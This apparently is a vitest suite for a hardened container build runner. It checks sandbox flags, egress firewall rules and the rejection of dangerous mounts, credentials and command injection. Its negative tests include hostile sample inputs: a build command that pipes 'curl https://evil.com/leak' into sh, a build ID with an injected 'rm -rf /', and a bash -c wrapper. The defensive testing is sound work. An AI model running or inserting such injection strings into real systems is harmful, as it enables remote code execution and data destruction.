import { describe, expect, it } from 'vitest';
import {
  BuildRunnerTask,
  HardenedBuildRunner,
  SecurityViolationException,
} from '../src/index.js';

describe('HardenedBuildRunner Security & Isolation Controls', () => {
  const runner = new HardenedBuildRunner();

  const validTask: BuildRunnerTask = {
    buildId: 'bld-001',
    organizationId: 'org-001',
    repoUrl: 'https://github.com/acme/untrusted-repo.git',
    commitSha: 'a'.repeat(40),
    buildCommand: 'npm run build',
    environmentVariables: {
      PUBLIC_APP_TITLE: 'My App',
    },
    volumeMounts: [
      { hostPath: '/tmp/opspilot/workspace-bld-001', containerPath: '/workspace', readOnly: false },
    ],
  };

  it('generates non-root user and dropped capability flags', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);

    expect(spec.commandArgs).toContain('--user');
    expect(spec.commandArgs).toContain('10001:10001');
    expect(spec.commandArgs).toContain('--cap-drop=ALL');
    expect(spec.commandArgs).toContain('--security-opt=no-new-privileges:true');
    expect(spec.commandArgs).toContain('--read-only');
  });

  it('enforces bounded tmpfs storage limits to prevent host RAM exhaustion', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);

    expect(spec.commandArgs).toContain('--tmpfs=/tmp:rw,nosuid,size=512m');
    expect(spec.commandArgs).toContain('--tmpfs=/workspace:rw,nosuid,size=2048m');
  });

  it('enforces process and resource ceilings', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);

    expect(spec.commandArgs).toContain('--pids-limit=256');
    expect(spec.commandArgs).toContain('--memory=2048m');
    expect(spec.commandArgs).toContain('--memory-swap=2048m');
    expect(spec.commandArgs).toContain('--cpus=1.5');
  });

  it('enforces execution timeout of 15 minutes', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);
    expect(spec.timeoutMs).toBe(900 * 1000);
  });

  it('blocks cloud metadata and private network egress in firewall rules', () => {
    const rules = runner.generateEgressFirewallRules('br-opspilot');

    expect(rules).toContain('iptables -I FORWARD -i br-opspilot -d 169.254.169.254/32 -j DROP');
    expect(rules).toContain('iptables -I FORWARD -i br-opspilot -d 10.0.0.0/8 -j DROP');
    expect(rules).toContain('iptables -I FORWARD -i br-opspilot -d 172.16.0.0/12 -j DROP');
    expect(rules).toContain('iptables -I FORWARD -i br-opspilot -d 192.168.0.0/16 -j DROP');
  });

  it('strictly rejects any attempt to mount /var/run/docker.sock', () => {
    const maliciousTask: BuildRunnerTask = {
      ...validTask,
      volumeMounts: [
        { hostPath: '/var/run/docker.sock', containerPath: '/var/run/docker.sock' },
      ],
    };

    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
      SecurityViolationException
    );
  });

  it('strictly rejects attempts to mount host root/system directories', () => {
    const maliciousTask: BuildRunnerTask = {
      ...validTask,
      volumeMounts: [{ hostPath: '/etc', containerPath: '/host-etc' }],
    };

    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
      SecurityViolationException
    );
  });

  it('strictly rejects passing provider API keys or credentials in build environment', () => {
    const maliciousTask1: BuildRunnerTask = {
      ...validTask,
      environmentVariables: {
        AWS_SECRET_ACCESS_KEY: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      },
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask1)).toThrow(
      SecurityViolationException
    );

    const maliciousTask2: BuildRunnerTask = {
      ...validTask,
      environmentVariables: {
        CLOUDFLARE_API_TOKEN: '0123456789abcdef0123456789abcdef01234567',
      },
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask2)).toThrow(
      SecurityViolationException
    );

    const maliciousTask3: BuildRunnerTask = {
      ...validTask,
      environmentVariables: {
        SSH_PRIVATE_KEY: 'secret-key-data',
      },
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask3)).toThrow(
      SecurityViolationException
    );
  });

  it('enforces network isolation defaulting to --network=none', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);
    expect(spec.commandArgs).toContain('--network=none');
  });

  it('supports explicit isolated-bridge network mode', () => {
    const taskWithBridge: BuildRunnerTask = {
      ...validTask,
      networkMode: 'isolated-bridge',
    };
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', taskWithBridge);
    expect(spec.commandArgs).toContain('--network=isolated-bridge');
  });

  it('strictly rejects host networking (--network=host)', () => {
    const maliciousTask = {
      ...validTask,
      networkMode: 'host' as const,
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask as BuildRunnerTask)).toThrow(
      /Host networking \(--network=host\) is strictly forbidden/
    );
  });

  it('generates deterministic container name and cleanup command', () => {
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', validTask);
    expect(spec.containerName).toBe('opspilot-build-bld-001');
    expect(spec.commandArgs).toContain('--name=opspilot-build-bld-001');

    const cleanupCmd = runner.generateCleanupCommand('bld-001');
    expect(cleanupCmd).toBe('docker rm -f opspilot-build-bld-001');

    expect(() => runner.generateCleanupCommand('bld; rm -rf /')).toThrow(
      /Invalid buildId for container cleanup/
    );
  });

  it('supports validated argv arrays and populates spec.argv', () => {
    const taskWithArgv: BuildRunnerTask = {
      ...validTask,
      commandArgs: ['npm', 'run', 'build:production'],
    };
    const spec = runner.prepareExecutionSpec('opspilot/node-runner:latest', taskWithArgv);
    expect(spec.argv).toEqual(['npm', 'run', 'build:production']);
  });

  it('strictly rejects shell metacharacters in legacy buildCommand string', () => {
    const maliciousTask: BuildRunnerTask = {
      ...validTask,
      buildCommand: 'npm run build; curl https://evil.com/leak | sh',
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
      /Unsafe shell metacharacters detected in buildCommand/
    );
  });

  it('strictly rejects shell wrapper execution in commandArgs', () => {
    const maliciousTask: BuildRunnerTask = {
      ...validTask,
      commandArgs: ['bash', '-c', 'echo pwned'],
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
      /Wrapping build commands in shell execution \(sh -c \/ bash -c\) is strictly forbidden/
    );
  });

  it('strictly rejects null bytes in commandArgs', () => {
    const maliciousTask: BuildRunnerTask = {
      ...validTask,
      commandArgs: ['npm\0run', 'build'],
    };
    expect(() => runner.prepareExecutionSpec('runner:latest', maliciousTask)).toThrow(
      /commandArgs cannot contain null bytes/
    );
  });
});
